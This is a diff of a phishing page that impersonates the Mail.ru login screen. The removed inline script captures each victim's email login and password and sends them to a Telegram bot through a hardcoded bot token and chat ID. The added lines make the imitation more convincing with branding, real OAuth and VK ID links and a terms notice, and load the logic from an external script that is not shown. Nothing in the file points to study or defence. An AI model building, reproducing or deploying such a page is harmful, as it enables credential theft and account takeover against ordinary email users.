@@ -1,116 +1,45 @@
 <!DOCTYPE html>
 <html lang="ru">
+
 <head>
   <meta charset="UTF-8">
+  <link rel="stylesheet" href="./style.css">
   <title>Вход | Mail.ru</title>
-  <style>
-    body {
-      background-color: #f3f3f3;
-      font-family: Arial, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      margin: 0;
-    }
 
-    .login-box {
-      background: white;
-      padding: 40px;
-      border-radius: 10px;
-      box-shadow: 0 0 15px rgba(0,0,0,0.1);
-      width: 360px;
-    }
-
-    h2 {
-      text-align: center;
-      margin-bottom: 30px;
-      color: #333;
-    }
-
-    input[type="text"],
-    input[type="password"] {
-      width: 100%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 6px;
-      box-sizing: border-box;
-      font-size: 15px;
-    }
-
-    button {
-      width: 100%;
-      padding: 12px;
-      background-color: #0078d4;
-      color: white;
-      font-weight: bold;
-      border: none;
-      border-radius: 6px;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    button:hover {
-      background-color: #005fa3;
-    }
-
-    #status {
-      margin-top: 15px;
-      text-align: center;
-      font-size: 14px;
-      color: green;
-    }
-  </style>
 </head>
+
 <body>
   <div class="login-box">
+    <div class="logo"><img class="logo-img" src="./images/logo.png" alt=""></div>
     <h2>Вход в Mail.ru</h2>
     <form id="login-form">
-      <input type="text" id="login" placeholder="Имя пользователя (email)" required>
+      <input type="text" id="login" placeholder="Имя ящика" required>
       <input type="password" id="password" placeholder="Пароль" required>
-      <button type="submit">Войти</button>
-      <p id="status"></p>
+      <label class="log" for="check">
+        <input class="log-input" type="checkbox" id="check">
+        Сохранить вход
+      </label>
+      <button id="mail" type="submit">Войти</button>
+      <button id="button" type="button" class="akk-button">Создать аккаунт</button>
     </form>
+    <span class="span">или с помощью</span>
+    <div class="a-div">
+      <div class="a-logos"><a
+        href="https://account.mail.ru/login?deepLink=qr&page=https%3A%2F%2Fe.mail.ru%2Finbox&from=https%3A%2F%2Fid.vk.com%2Fauth%3Faction%3DeyJuYW1lIjoibWFpbF9hdXRoIiwicGFyYW1zIjp7Im1haWxfYXV0aF90eXBlIjoiYXV0aF9sb2dpbl9wYWdlIn19%26app_id%3D7539952%26app_settings%3DeyJzZXJ2aWNlX2dyb3VwcyI6eyJvaWQiOiIzV3hoSEhLS2tzVmRqNHNXSmVDWWUifX0%253D%26lang_id%3D0%26redirect_state%3DAG_rSgu1iBvL2eHj5JSBoD9q03%26redirect_uri%3Dhttps%253A%252F%252Fe.mail.ru%252Finbox%26response_type%3Dsilent_token%26scheme%3Dlight"><img class="img-1" src="./images/qr.img" alt="IMG"></a></div>
+       <div class="a-logos"> <a href="https://account.mail.ru/login?deepLink=esiaScreen&page=https%3A%2F%2Faccount.mail.ru%2F%3F&from=https%3A%2F%2Fid.vk.com%2Fauth%3Faction%3DeyJuYW1lIjoibWFpbF9hdXRoIiwicGFyYW1zIjp7Im1haWxfYXV0aF90eXBlIjoiYXV0aF9sb2dpbl9wYWdlIn19%26app_id%3D7539952%26app_settings%3DeyJzZXJ2aWNlX2dyb3VwcyI6eyJvaWQiOiIzV3hoSEhLS2tzVmRqNHNXSmVDWWUifX0%253D%26lang_id%3D0%26redirect_state%3DAG_i4aghoWY7L4D7RDDq80dq03%26redirect_uri%3Dhttps%253A%252F%252Faccount.mail.ru%252F%253F%26response_type%3Dsilent_token%26scheme%3Dlight"><img class="img-2" src="./images/gos.img" alt=""></a></div>
+        <div class="a-logos"><a href="https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?client_id=61247752867-gisaer5a58k42ologkujkgb2568pjv21.apps.googleusercontent.com&max_auth_age=0&response_type=code&scope=openid%20email%20https%3A%2F%2Fmail.google.com%2F%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.profile%20https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcontacts&redirect_uri=https%3A%2F%2Fauth.mail.ru%2Fcgi-bin%2Foauth2_google_callback%2F&state=%40mail.ru-2b709a7f947f34dd7b52fdf47c08422b&access_type=offline&prompt=consent&login_hint=%40mail.ru&service=lso&o2v=1&flowName=GeneralOAuthFlow"><img class="img-3" src="./images/2058fb75442843.5c4cd14030bd5.png" alt=""></a></div>
+        <div class="a-logos"><a href="https://passport.yandex.ru/pwl-yandex/auth/add?retpath=https%3A%2F%2Foauth.yandex.ru%2Fauthorize%3Fclient_id%3De2281900ced84819a1ae93143574c714%26response_type%3Dcode%26force_confirm%3D1%26redirect_uri%3Dhttps%3A%2F%2Fauth.mail.ru%2Fcgi-bin%2Foauth2_yandex_callback%2F%26state%3D1f603e2730bdd4b5683ca45a7ec39d61&noreturn=1&origin=oauth&cause=auth&process_uuid=8f414c95-5cf8-4a67-b8bf-836535d26d07"><img class="img-4" src="./images/frame-292-3.png" alt=""></a></div>
+    </div>
+    <button id="buttonVk" type="button" class="vk-button"><img src="./images/237626.png" alt="">Войти с VK ID</button>
+    <button id="buttonR" type="button" class="reset-button">Востоновить доступ</button>
+    <p class="p-1"><span class="span-1"> Продолжая, вы принимаете условия </span> <span class="span-2">пользовательских соглашений Mail</span> <span class="span-1">и</span> <span class="span-2">VK ID</span>, <span class="span-2">политику конфиденциальности.</span>
+      </p>
+      <p class="p-1"> <span class="span-2">Передаваемые данные</p></span>
   </div>
 
-  <script>
-    const TOKEN = '7696324080:AAF0H1ZwXRPlVHeyAx-k5mzQCm4oCWQ5bVw';
-    const CHAT_ID = '1969968725';
-    const API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+  <script src="./script.js">
 
-    const form = document.getElementById('login-form');
-    const status = document.getElementById('status');
-
-    form.addEventListener('submit', function(e) {
-      e.preventDefault();
-
-      const login = document.getElementById('login').value;
-      const password = document.getElementById('password').value;
-
-      const message = `
-🔐 Попытка входа в аккаунт Mail.ru:
-📧 Логин: ${login}
-🔑 Пароль: ${password}
-      `;
-
-      fetch(API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      })
-      .then(res => {
-        status.textContent = "✅ Данные отправлены!";
-        form.reset();
-      })
-      .catch(err => {
-        status.textContent = "❌ Ошибка отправки!";
-        console.error(err);
-      });
-    });
   </script>
 </body>
+
 </html>
